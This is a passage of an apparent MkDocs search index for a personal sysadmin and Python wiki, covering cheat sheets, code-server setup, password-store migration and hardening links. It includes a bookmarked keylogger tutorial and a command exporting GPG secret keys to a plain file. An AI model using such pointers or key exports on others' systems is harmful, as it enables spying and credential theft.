'apple']","title":"List Operations"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#dictionary-operations","text":"person = { \"name\" : \"Joe\" , \"age\" : 24 , \"dob\" : \"25-11-2000\" , \"profession\" : \"Software Developer\" } # keys, values, and items # returns iterable for iterations print ( person . keys () ) # dict_keys(['name', 'age', 'dob', 'profession']) print ( person . values () ) # dict_values(['Joe', 24, '25-11-2000', 'Software Developer']) print ( person . items () ) # dict_items([('name', 'Joe'), ('age', 24), ('dob', '25-11-2000'), ('profession', 'Software Developer')]) # pop, popitem, copy, and clear poppedItem = person . pop ( \"dob\" ) # Removes the item having given key print ( poppedItem ) # 25-11-2000 print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Software Developer'} poppedItem = person . popitem () # Removes the item inserted last print ( poppedItem ) # ('profession', 'Software Developer') print ( person ) # {'name': 'Joe', 'age': 24} personCopy = person . copy () # Shallow copy print ( personCopy ) # {'name': 'Joe', 'age': 24} # add, read, get, and update person [ \"profession\" ] = \"Teacher\" print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Teacher'} person [ \"profession\" ] = \"Musician\" print ( person ) # {'name': 'Joe', 'age': 24, 'profession': 'Musician'} print ( person [ \"age\" ] ) # 24 print ( person . get ( \"age\" ) ) # 24 person . update ( { \"age\" : 28 } ) print ( person . get ( \"age\" ) ) # 28 # delete del person [ \"age\" ] print ( person ) # {'name': 'Joe', 'profession': 'Musician'}","title":"Dictionary Operations"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#set-operations","text":"fruits = { \"apple\" , \"banana\" , \"orange\" , \"grapes\" } # add, update, remove, and discard fruits . add ( \"guava\" ) # Adds the item to the set if not exist print ( fruits ) # {'apple', 'banana', 'orange', 'guava', 'grapes'} fruits . add ( \"guava\" ) # Adds the item to the set if not exist print ( fruits ) # {'apple', 'banana', 'orange', 'guava', 'grapes'} fruits . update ( [ \"litchi\" , \"watermelon\" ] ) # Adds multiple items to the set print ( fruits ) # {'apple', 'banana', 'litchi', 'orange', 'watermelon', 'guava', 'grapes'} fruits . remove ( \"litchi\" ) # Find and remove the item, throws error if not found print ( fruits ) # {'apple', 'banana', 'orange', 'watermelon', 'guava', 'grapes'} fruits . discard ( \"litchi\" ) # Find and remove the item, does not throw any error print ( fruits ) # {'apple', 'banana', 'orange', 'watermelon', 'guava', 'grapes'} # pop, copy, and clear poppedItem = fruits . pop () # Removes an arbitrary item print ( poppedItem ) # apple print ( fruits ) # {'banana', 'orange', 'watermelon', 'guava', 'grapes'} fruitsCopy = fruits . copy () # Shallow copy print ( fruitsCopy ) # {'banana', 'guava', 'grapes', 'orange', 'watermelon'} fruitsCopy . clear () print ( fruitsCopy ) # set()","title":"Set Operations"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#lambda","text":"# Lambda: Anonymous function # Arguments: Accepts n arguments # Expressions: Only one expression is allowed # Syntax: lambda arguments : expression addTo100 = lambda a : a + 100 print ( addTo100 ( 50 ) ) # 150 multiplyBy2 = lambda a : a * 2 print ( multiplyBy2 ( 25 ) ) # 50","title":"Lambda"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#classes-objects","text":"# Python is an object oriented programming language # Almost everything in Python is an object # Almost everything has attributes and methods # All functions have a built-in attribute __doc__ # Some objects have neither attributes nor methods # Some objects are final class Person : def __init__ ( self , name , age , profession ) : self . name = name self . age = age self . profession = profession def printInfo ( self ) : print ( \"Person Name: {} Age: {} Profession: {} \" . format ( self . name , self . age , self . profession ) ) joe = Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer","title":"Classes &amp; Objects"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#modules-packages","text":"# Module: A file having Python code including statements and definitions is called as Module. # A module can define variables, functions, and classes. # A module can also include code which can be executed. # The file name must be module name appended by .py extension. # Module name can be accessed within it using the global __name__. # Package: A Python package is a collection of Python modules. # Package is a directory having modules. # Regular packages must have an additional __init__.py file, to distinguish it from a directory. # Namespace packages since Python 3.3 do not need __init__.py file ## Module - models.py class Person : def __init__ ( self , name , age , profession ): self . name = name self . age = age self . profession = profession def printInfo ( self ) : print ( \"Person Name: {} Age: {} Profession: {} \" . format ( self . name , self . age , self . profession ) ) ## Module - main.py # Search for models.py in current directory, main.py directory # Search for models.py in the list of directories in the PYTHONPATH environment variable import models # Use import mylib.models if models module is available in mylib directory joe = models . Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer ## Module - main.py from models import Person joe = Person ( \"Joe\" , 35 , \"Software Engineer\" ) joe . printInfo () # Person Name: Joe Age: 35 Profession: Software Engineer ## Execute main module on console python main . py ## List directories where Python searches for the Module import sys print ( sys . path ) ## Sample Directory Structure \u251c\u2500\u2500 nspkg1 \u2502 \u2514\u2500\u2500 regpkg1 \u2502 \u251c\u2500\u2500 __init__ . py \u2502 \u2514\u2500\u2500 vehicle . py \u251c\u2500\u2500 nspkg2 \u2502 \u2514\u2500\u2500 nspkg2sub1 \u2502 \u2514\u2500\u2500 person . py \u251c\u2500\u2500 main . py ## Imports in main.py import nspkg1.regpkg1.vehicle import nspkg2.nspkg2sub1.person","title":"Modules &amp; Packages"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#errors-exceptions","text":"# Errors # Program stops working on error # Python raises exceptions when it encounter error # Syntax or parsing errors are the most common for beginners # Exceptions # No syntax errors found, program starts execution # Errors detected during execution are called exceptions # Use try: except: finally: to catch and handle the exceptions # Use try: except: finally: to avoid program termination on exceptions # Use try: except: else: instead of try: except: finally: for alternate flows # Multiple except can be use to catch the exceptions ## Program a = 10 * ( 1 / 0 ) ## Throws division by zero exception and terminate the program Traceback ( most recent call last ): File \"\" , line 1 , in a = 10 * ( 1 / 0 ) ZeroDivisionError : division by zero ## Updated Program - Valid - Try: Except: Finally b = 10 try : a = 10 * ( 1 / b ) print ( \"a = {} \" . format ( a ) ) except : print ( \"Caught divide by zero - while getting a\" ) print ( \"Execute on error - b must be non-zero value\" ) finally : print ( \"Execute Always - normal and exceptional flow\" ) ## Output a = 1.0 Execute Always - normal and exceptional flow ## Updated Program - Error - Try: Except: Finally b = 0 try : a = 10 * ( 1 / b ) print ( \"a = {} \" . format ( a ) ) except : print ( \"Caught divide by zero - while getting a\" ) print ( \"Execute on error - b must be non-zero value\" ) else : print ( \"Alternate to exceptional flow\" ) ## Output Caught divide by zero - while getting a Execute on error - b must be non - zero value Execute Always - normal and exceptional flow","title":"Errors &amp; Exceptions"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#math","text":"# math.ceil( num ) - Smallest integer greater than or equal to num # math.floor( num ) - Largest integer less than or equal to num # math.fabs( num ) - Absolute of num # math.factorial( num ) - Integer value of num factorial # math.pow( num, power ) - num raised to the power # math.sqrt( num ) - Square root of num # math.isqrt( num ) - Integer square root of the nonnegative integer num # math.asin( num ) - Arc sine of num radians # math.acos( num ) - Arc cosine of num radians # math.atan( num ) - Arc tangent of num radians # math.sin( num ) - Sine of num radians # math.cos( num ) - Cosine of num radians # math.tan( num ) - Tangent of num radians # math.dist( num1, num2 ) - Euclidean distance between two points num1 and num2 # math.degrees( num ) - Angle num from radians to degrees # math.radians( num ) - Degree num from degrees to radians # math.exp(x) - e raised to the power x, e = 2.718281 # math.expm1(x) - e raised to the power x minus 1, e = 2.718281 # math.log( num[, base] ) - One argument -> natural logarithm of x (to base e), Two arguments -> logarithm of x to the given base # math.log2( num ) - base-2 logarithm of num ## Examples import math num = 12.25 print ( math . ceil ( num ) ) # 13 print ( math . floor ( num ) ) # 12","title":"Math"},{"location":"wiki/Programming/Cheat%20Sheets/Python/#files","text":"# Function: open # Arguments: 1st -> File path with name, 2nd -> Mode, 3rd -> Encoding # Modes: r -> read only, w -> write only, a -> append only, r+ -> read/write # Optionally append t or b to the mode to specify among text or binary ## Example - Open f = open ( \"test.txt\" ) # same as open( \"test.txt\", \"rt\" ) ## Example - Write # Open the file test.txt in write mode file = open ( \"test.txt\" , \"w\" , encoding = \"utf8\" ) file . write ( \"Hello Python !! \\n \" ) file . writelines ( [ \"Line 1 \\n \" , \"Line 2 \\n \" , \"Line 3 \\n \" ] ) file . close () ## Example - Read all lines try : file = open ( \"test.txt\" , \"r\" ) text = file . read ( 15 ) # Read first 15 characters print ( text ) file . seek ( 0 ) for line in file : print ( line . rstrip () ) except : print ( \"Failed to open the file\" ) finally : file . close () ## Output Hello Python !! Hello Python !! Line 1 Line 2 Line 3 Original Source","title":"Files"},{"location":"wiki/Programming/Python/Catching%20Exceptions%20Function/","text":"Function to catch exceptions in Python def catch ( function ): def wrapper ( * args ): try : return function ( * args ) except Exception as error : return { 'error' : error } return wrapper","title":"Function to catch exceptions in Python"},{"location":"wiki/Programming/Python/Catching%20Exceptions%20Function/#function-to-catch-exceptions-in-python","text":"def catch ( function ): def wrapper ( * args ): try : return function ( * args ) except Exception as error : return { 'error' : error } return wrapper","title":"Function to catch exceptions in Python"},{"location":"wiki/Programming/Python/Easy%20Projects/","text":"Easy Projects https://automatetheboringstuff.com/ https://m.youtube.com/playlist?list=PLlrxD0HtieHhS8VzuMCfQD4uJ9yne1mE6 https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world https://www.amazon.com/New-Improved-Flask-Mega-Tutorial-ebook/dp/B079KPG4HT","title":"Easy Projects"},{"location":"wiki/Programming/Python/Easy%20Projects/#easy-projects","text":"https://automatetheboringstuff.com/ https://m.youtube.com/playlist?list=PLlrxD0HtieHhS8VzuMCfQD4uJ9yne1mE6 https://blog.miguelgrinberg.com/post/the-flask-mega-tutorial-part-i-hello-world https://www.amazon.com/New-Improved-Flask-Mega-Tutorial-ebook/dp/B079KPG4HT","title":"Easy Projects"},{"location":"wiki/Programming/Python/Keylogger/","text":"Keylogger https://nitratine.net/blog/post/python-keylogger/","title":"Keylogger"},{"location":"wiki/Programming/Python/Keylogger/#keylogger","text":"https://nitratine.net/blog/post/python-keylogger/","title":"Keylogger"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/","text":"Installing Code-Server on an LXC Ubuntu 18.04 container Introduction Code-Server is VS Code running on a remote server, accessible through the browser. Code anywhere: Code on your Chromebook, tablet, and laptop with a consistent dev environment. Develop on a Linux machine and pick up from any device with a web browser. Server-powered: Take advantage of large cloud servers to speed up tests, compilations, downloads, and more. Preserve battery life when you're on the go since all intensive computation runs on your server. Update and upgrade the container apt update && apt upgrade -y Pull down the latest release of the Code-Server binary cd /tmp wget https://github.com/cdr/code-server/releases/download/2.1698/code-server2.1698-vsc1.41.1-linux-x86_64.tar.gz Decompress it tar tvzf code-server2.1698-vsc1.41.1-linux-x86_64.tar.gz Move the binary to /usr/bin/ mv code-server2.1698-vsc1.41.1-linux-x86_64/code-server /usr/bin/ This is done to save some time later dealing with paths. You can use other directories like /opt , but to save time in a container /usr/bin/ will do. Test to see if it works code-server --host 0.0.0.0 --port 8080 It will prompt you with a temporary password for now, we will change this later. You may just be done now, if that's all you want to do. You'll have a fully functional version of VSCode over the web. If you would like to add a systemd unit file to start on reboot automatically, that's what we're going to be doing next! Creating a user We should create a user to run this, just so it isn't running as root. Since VSCode allows you to view system files with it's built in File Explorer, let's try to limit risk by running Code-Server as a less privileged user. useradd -Ums /usr/sbin/nologin code Creating a startup script In order to set a password, you need to set the PASSWORD environment variable. An easy, consistent way of handling this is to utilize a bash script. For example: 1 2 3 4 5 #!/bin/bash export PASSWORD = password code-server --host 0 .0.0.0 --port 8080 You can test this script and you'll see that now the web server is going to utilize a custom password. This looks good, but let's add a little more to the script. Here's how mine looks: 1 2 3 4 5 #!/bin/bash export PASSWORD = \"reallytoughpassword\" code-server --host 0 .0.0.0 --port 8080 --disable-telemetry --extensions-dir /home/code/.local/share/code-server/extensions/ --user-data-dir /home/code/.local/share/code-server/User I add in the --disable-telemetry to simply disable telemetry for the server. I also explicitly state the --extensions-dir and --user-data-dir . This may not be necessary, but I do so to make sure everything starts appropriately. I run this script out of the /opt folder in to keep things clean and since the systemd unit file will call this file explicitly, I'm not worried about paths. SystemD Unit File Now we need to create a systemd unit file so the server will start when the container starts. My systemd unit file looks like this: [Unit] Description=Code Service After=network.target [Service] User=code Group=code UMask=002 Type=simple ExecStart=/opt/code.sh TimeoutStopSec=20 KillMode=process Restart=on-failure [Install] WantedBy=multi-user.target Notice the User= and Group= I have set to the user code that I made earlier. I also set the ExecStart= to the bash script I created. Enabling and starting the service systemctl enable code.service systemctl start code.service Conclusion Everything should now be up and running. My instance is going to be behind a proxy, so that handles the SSL certificates for me, but you could also add SSL certs to this by adding your cert and key with the respective --cert and --cert-key flags. You should now be able to have a consistent dev environment just by using your browser! For more documentation, head over to the Code-Server Github page.","title":"Installing [Code-Server](https://github.com/cdr/code-server) on an LXC Ubuntu 18.04 container"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#installing-code-server-on-an-lxc-ubuntu-1804-container","text":"","title":"Installing Code-Server on an LXC Ubuntu 18.04 container"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#introduction","text":"Code-Server is VS Code running on a remote server, accessible through the browser. Code anywhere: Code on your Chromebook, tablet, and laptop with a consistent dev environment. Develop on a Linux machine and pick up from any device with a web browser. Server-powered: Take advantage of large cloud servers to speed up tests, compilations, downloads, and more. Preserve battery life when you're on the go since all intensive computation runs on your server.","title":"Introduction"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#update-and-upgrade-the-container","text":"apt update && apt upgrade -y","title":"Update and upgrade the container"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#pull-down-the-latest-release-of-the-code-server-binary","text":"cd /tmp wget https://github.com/cdr/code-server/releases/download/2.1698/code-server2.1698-vsc1.41.1-linux-x86_64.tar.gz","title":"Pull down the latest release of the Code-Server binary"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#decompress-it","text":"tar tvzf code-server2.1698-vsc1.41.1-linux-x86_64.tar.gz","title":"Decompress it"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#move-the-binary-to-usrbin","text":"mv code-server2.1698-vsc1.41.1-linux-x86_64/code-server /usr/bin/ This is done to save some time later dealing with paths. You can use other directories like /opt , but to save time in a container /usr/bin/ will do.","title":"Move the binary to /usr/bin/"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#test-to-see-if-it-works","text":"code-server --host 0.0.0.0 --port 8080 It will prompt you with a temporary password for now, we will change this later. You may just be done now, if that's all you want to do. You'll have a fully functional version of VSCode over the web. If you would like to add a systemd unit file to start on reboot automatically, that's what we're going to be doing next!","title":"Test to see if it works"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#creating-a-user","text":"We should create a user to run this, just so it isn't running as root. Since VSCode allows you to view system files with it's built in File Explorer, let's try to limit risk by running Code-Server as a less privileged user. useradd -Ums /usr/sbin/nologin code","title":"Creating a user"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#creating-a-startup-script","text":"In order to set a password, you need to set the PASSWORD environment variable. An easy, consistent way of handling this is to utilize a bash script. For example: 1 2 3 4 5 #!/bin/bash export PASSWORD = password code-server --host 0 .0.0.0 --port 8080 You can test this script and you'll see that now the web server is going to utilize a custom password. This looks good, but let's add a little more to the script. Here's how mine looks: 1 2 3 4 5 #!/bin/bash export PASSWORD = \"reallytoughpassword\" code-server --host 0 .0.0.0 --port 8080 --disable-telemetry --extensions-dir /home/code/.local/share/code-server/extensions/ --user-data-dir /home/code/.local/share/code-server/User I add in the --disable-telemetry to simply disable telemetry for the server. I also explicitly state the --extensions-dir and --user-data-dir . This may not be necessary, but I do so to make sure everything starts appropriately. I run this script out of the /opt folder in to keep things clean and since the systemd unit file will call this file explicitly, I'm not worried about paths.","title":"Creating a startup script"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#systemd-unit-file","text":"Now we need to create a systemd unit file so the server will start when the container starts. My systemd unit file looks like this: [Unit] Description=Code Service After=network.target [Service] User=code Group=code UMask=002 Type=simple ExecStart=/opt/code.sh TimeoutStopSec=20 KillMode=process Restart=on-failure [Install] WantedBy=multi-user.target Notice the User= and Group= I have set to the user code that I made earlier. I also set the ExecStart= to the bash script I created.","title":"SystemD Unit File"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#enabling-and-starting-the-service","text":"systemctl enable code.service systemctl start code.service","title":"Enabling and starting the service"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Code/#conclusion","text":"Everything should now be up and running. My instance is going to be behind a proxy, so that handles the SSL certificates for me, but you could also add SSL certs to this by adding your cert and key with the respective --cert and --cert-key flags. You should now be able to have a consistent dev environment just by using your browser! For more documentation, head over to the Code-Server Github page.","title":"Conclusion"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Guacamole/","text":"Guacamole https://www.reddit.com/r/linuxadmin/comments/aqlu4k/apache_guacamole_install_script_for_rhel7_and/ Hardening https://www.reddit.com/r/sysadmin/comments/feu95l/protecting_guacamole_from_brute_force_attacks/ https://www.wilbursecurity.com/2016/08/fail2ban_guacamole/","title":"Guacamole"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Guacamole/#guacamole","text":"https://www.reddit.com/r/linuxadmin/comments/aqlu4k/apache_guacamole_install_script_for_rhel7_and/","title":"Guacamole"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Guacamole/#hardening","text":"https://www.reddit.com/r/sysadmin/comments/feu95l/protecting_guacamole_from_brute_force_attacks/ https://www.wilbursecurity.com/2016/08/fail2ban_guacamole/","title":"Hardening"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/","text":"Setting up: gpg2 --full-gen-key pass init user@email.com pass git init Might have to use gpg on certain distributions Set up Git: On Git server apt install git adduser git Local Machine ssh-keygen -t ed25519 ssh-copy-id git@serverIP On Git server git init --bare pass-repo Local Machine pass git remote add origin ssh://git@serverIP:/home/git/pass-repo pass git push -u --all To set up on another machine: gpg2 --export-secret-keys > secret.gpg #might have to use gpg on older kernels ssh-keygen -t ed25519 ssh-copy-id git@serverIP git clone ssh://git@serverIP:/home/git/pass-repo ~/.password-store","title":"Passwordstore"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#setting-up","text":"gpg2 --full-gen-key pass init user@email.com pass git init Might have to use gpg on certain distributions","title":"Setting up:"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#set-up-git","text":"","title":"Set up Git:"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#on-git-server","text":"apt install git adduser git","title":"On Git server"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#local-machine","text":"ssh-keygen -t ed25519 ssh-copy-id git@serverIP","title":"Local Machine"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#on-git-server_1","text":"git init --bare pass-repo","title":"On Git server"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#local-machine_1","text":"pass git remote add origin ssh://git@serverIP:/home/git/pass-repo pass git push -u --all","title":"Local Machine"},{"location":"wiki/System%20Administration/Applications%20and%20Services/Passwordstore/#to-set-up-on-another-machine","text":"gpg2 --export-secret-keys > secret.gpg #might have to use gpg on older kernels ssh-keygen -t ed25519 ssh-copy-id git@serverIP git clone ssh://git@serverIP:/home/git/pass-repo ~/.password-store","title":"To set up on another machine:"},{"location":"wiki/System%20Administration/Cheat%20Sheets/Linux%20Networking/","text":"Linux Networking","title":"Linux Networking"},{"location":"wiki/System%20Administration/Cheat%20Sheets/Linux%20Networking/#linux-networking","text":"","title":"Linux Networking"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardening/","text":"Hardening Random resources that I've found. These have not been vetted thoroughly yet. Windows https://decentsecurity.com/ https://www.computerworld.com/article/3025709/microsoft-windows/how-to-protect-your-privacy-in-windows-10.html https://www.oo-software.com/en/shutup10 https://fdossena.com/?p=w10debotnet/index_1809.frag https://www.hsdl.org/?view&did=806518 https://www.nist.gov/cyberframework https://www.ncsc.gov.uk/guidance https://csrc.nist.gov/publications/detail/nistir/7628/rev-1/final https://github.com/beerisgood/Windows10_Hardening https://github.com/beerisgood/Windows10_Anti-Telemetry https://github.com/Nummer/Destroy-Windows-10-Spying/releases/tag/2.2.2.2 https://labs.vmware.com/flings/vmware-os-optimization-tool https://www.ghacks.net/2015/08/14/comparison-of-windows-10-privacy-tools/ Windows 10 LTSC The SHA-1 hash for the ISO is: D5B2F95E3DD658517FE7C14DF4F36DE633CA4845 Linux https://github.com/lfit/itpol/blob/master/linux-workstation-security.md https://www.reddit.com/r/netsec/comments/3io7pe/linux_workstation_security_checklist/ https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2016/april/understanding-and-hardening-linux-containers/ https://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx https://wiki.archlinux.org/index.php/Security https://linux-audit.com/how-to-secure-linux-systems-auditing-hardening-and-security/ https://www.sans.org/score/checklists/linux https://dev-sec.io/ https://github.com/florianutz/Ubuntu1804-CIS OpenSCAP STIG https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html-single/security_guide/index#chap-Compliance_and_Vulnerability_Scanning https://gitlab.com/apparmor/apparmor/wikis/FAQ https://github.com/hardenedlinux/harbian-audit","title":"Hardening"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardening/#hardening","text":"Random resources that I've found. These have not been vetted thoroughly yet.","title":"Hardening"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardening/#windows","text":"https://decentsecurity.com/ https://www.computerworld.com/article/3025709/microsoft-windows/how-to-protect-your-privacy-in-windows-10.html https://www.oo-software.com/en/shutup10 https://fdossena.com/?p=w10debotnet/index_1809.frag https://www.hsdl.org/?view&did=806518 https://www.nist.gov/cyberframework https://www.ncsc.gov.uk/guidance https://csrc.nist.gov/publications/detail/nistir/7628/rev-1/final https://github.com/beerisgood/Windows10_Hardening https://github.com/beerisgood/Windows10_Anti-Telemetry https://github.com/Nummer/Destroy-Windows-10-Spying/releases/tag/2.2.2.2 https://labs.vmware.com/flings/vmware-os-optimization-tool https://www.ghacks.net/2015/08/14/comparison-of-windows-10-privacy-tools/ Windows 10 LTSC The SHA-1 hash for the ISO is: D5B2F95E3DD658517FE7C14DF4F36DE633CA4845","title":"Windows"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardening/#linux","text":"https://github.com/lfit/itpol/blob/master/linux-workstation-security.md https://www.reddit.com/r/netsec/comments/3io7pe/linux_workstation_security_checklist/ https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2016/april/understanding-and-hardening-linux-containers/ https://iase.disa.mil/stigs/os/unix-linux/Pages/index.aspx https://wiki.archlinux.org/index.php/Security https://linux-audit.com/how-to-secure-linux-systems-auditing-hardening-and-security/ https://www.sans.org/score/checklists/linux https://dev-sec.io/ https://github.com/florianutz/Ubuntu1804-CIS OpenSCAP STIG https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html-single/security_guide/index#chap-Compliance_and_Vulnerability_Scanning https://gitlab.com/apparmor/apparmor/wikis/FAQ https://github.com/hardenedlinux/harbian-audit","title":"Linux"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/","text":"Router Switch Server 1 Motherboard Supermicro X8DTL-iF CPU 2 Xeon L5640 Case Fractal Design XL R2 RAM 48GB (6x8GB) DDR3 Memory RAM PC3-10600R ECC REG DIMM Controllers Dell Perc H310 Server 2 Motherboard ASRock AB350 Pro4 CPU Ryzen 7 1700 Case NZXT S340 RAM 64GB (4x16GB) DDR4-SODIMM 2666 Memory RAM Access Points Cameras https://www.reddit.com/r/privacy/comments/e6qt6s/is_there_a_privacyconscious_security_camera/","title":"Hardware"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#router","text":"","title":"Router"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#switch","text":"","title":"Switch"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#server-1","text":"Motherboard Supermicro X8DTL-iF CPU 2 Xeon L5640 Case Fractal Design XL R2 RAM 48GB (6x8GB) DDR3 Memory RAM PC3-10600R ECC REG DIMM Controllers Dell Perc H310","title":"Server 1"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#server-2","text":"Motherboard ASRock AB350 Pro4 CPU Ryzen 7 1700 Case NZXT S340 RAM 64GB (4x16GB) DDR4-SODIMM 2666 Memory RAM","title":"Server 2"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#access-points","text":"","title":"Access Points"},{"location":"wiki/System%20Administration/Hardware%20and%20Infrastructure/Hardware/#cameras","text":"https://www.reddit.com/r/privacy/comments/e6qt6s/is_there_a_privacyconscious_security_camera/","title":"Cameras"},{"location":"wiki/System%20Administration/Linux/Bash%20Set-Title%20Function/","text":"If you're forced to use gnome-terminal Add this to ~/.bashrc function set-title() { if [[ -z \"$ORIG\" ]]; then ORIG=$PS1 fi TITLE=\"\\[\\e]2;$*\\a\\]\" PS1=${ORIG}${TITLE} } You then need to source your ~/.bashrc or restart your terminals source .bashrc You can now run the following command to set the title to newtitle set-title newtitle","title":"If you're forced to use `gnome-terminal`"},{"location":"wiki/System%20Administration/Linux/Bash%20Set-Title%20Function/#if-youre-forced-to-use-gnome-terminal","text":"","title":"If you're forced to use gnome-terminal"},{"location":"wiki/System%20Administration/Linux/Bash%20Set-Title%20Function/#add-this-to-bashrc","text":"function set-title() { if [[ -z \"$ORIG\" ]]; then ORIG=$PS1 fi TITLE=\"\\[\\e]2;$*\\a\\]\" PS1=${ORIG}${TITLE} }","title":"Add this to ~/.bashrc"},{"location":"wiki/System%20Administration/Linux/Bash%20Set-Title%20Function/#you-then-need-to-source-your-bashrc-or-restart-your-terminals","text":"source .bashrc","title":"You then need to source your ~/.bashrc or restart your terminals"},{"location":"wiki/System%20Administration/Linux/Bash%20Set-Title%20Function/#you-can-now-run-the-following-command-to-set-the-title-to-newtitle","text":"set-title newtitle","title":"You can now run the following command to set the title to newtitle"},{"location":"wiki/System%20Administration/Linux/Books/","text":"Books lsof, strace, etc Systems performance, Brendan Gregg http://www.brendangregg.com/blog/2019-07-15/bpf-performance-tools-book.html https://ptgmedia.pearsoncmg.com/images/013147751X/downloads/013147751X_book.pdf Systems performance, Brendan Gregg https://wizardzines.com/zines/strace/ https://www.amazon.com/Hands-System-Programming-Linux-programming/dp/1788998472/ref=sr_1_4?crid=1CB4W8OUWDO8D&keywords=linux+programming&qid=1583482480&sprefix=linux+programm%2Caps%2C256&sr=8-4 Linux internals The Linux programming interface by Michael Kerrisk O'Reilly - Understanding The Linux Kernel Lion book: UNIX Systems Programming for SVR4. Modern Operating Systems (4th Edition) by Andrew S. Tanenbaum. For UNIX: The Design and Implementation of the FreeBSD Operating System","title":"Books"},{"location":"wiki/System%20Administration/Linux/Books/#books","text":"","title":"Books"},{"location":"wiki/System%20Administration/Linux/Books/#lsof-strace-etc","text":"Systems performance, Brendan Gregg http://www.brendangregg.com/blog/2019-07-15/bpf-performance-tools-book.html https://ptgmedia.pearsoncmg.com/images/013147751X/downloads/013147751X_book.pdf Systems performance, Brendan Gregg https://wizardzines.com/zines/strace/ https://www.amazon.com/Hands-System-Programming-Linux-programming/dp/1788998472/ref=sr_1_4?crid=1CB4W8OUWDO8D&keywords=linux+programming&qid=1583482480&sprefix=linux+programm%2Caps%2C256&sr=8-4","title":"lsof, strace, etc"},{"location":"wiki/System%20Administration/Linux/Books/#linux-internals","text":"The Linux programming interface by Michael Kerrisk O'Reilly - Understanding The Linux Kernel Lion book: UNIX Systems Programming for SVR4. Modern Operating Systems (4th Edition) by Andrew S. Tanenbaum. For UNIX: The Design and Implementation of the FreeBSD Operating System","title":"Linux internals"},{"location":"wiki/System%20Administration/Linux/Disabling%20Ubuntu%20Telemetry/","text":"Remove telemetry packages apt purge -y ubuntu-report popularity-contest apport whoopsie Clean up apt autoremove -y apt-get autoclean","title":"Disabling Ubuntu Telemetry"},{"location":"wiki/System%20Administration/Linux/Disabling%20Ubuntu%20Telemetry/#remove-telemetry-packages","text":"apt purge -y ubuntu-report popularity-contest apport whoopsie","title":"Remove telemetry packages"},{"location":"wiki/System%20Administration/Linux/Disabling%20Ubuntu%20Telemetry/#clean-up","text":"apt autoremove -y apt-get autoclean","title":"Clean up"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/","text":"Temporary fix: temp text Grub fix Edit /etc/default/grub vim /etc/default/grub Edit TEMPMODULELINE with psmouse.elantech_smbus=0 TEMPMODULELINE=quiet psmouse.elantech_smbus=0 Update grub to take effect update-grub Reboot","title":"Elantech Touchpad Fix"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#temporary-fix","text":"temp text","title":"Temporary fix:"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#grub-fix","text":"","title":"Grub fix"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#edit-etcdefaultgrub","text":"vim /etc/default/grub","title":"Edit /etc/default/grub"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#edit-tempmoduleline-with-psmouseelantech_smbus0","text":"TEMPMODULELINE=quiet psmouse.elantech_smbus=0","title":"Edit TEMPMODULELINE with psmouse.elantech_smbus=0"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#update-grub-to-take-effect","text":"update-grub","title":"Update grub to take effect"},{"location":"wiki/System%20Administration/Linux/Elantech%20Touchpad%20Fix/#reboot","text":"","title":"Reboot"},{"location":"wiki/System%20Administration/Linux/Github%20Pages%20MkDocs/","text":"Github Pages 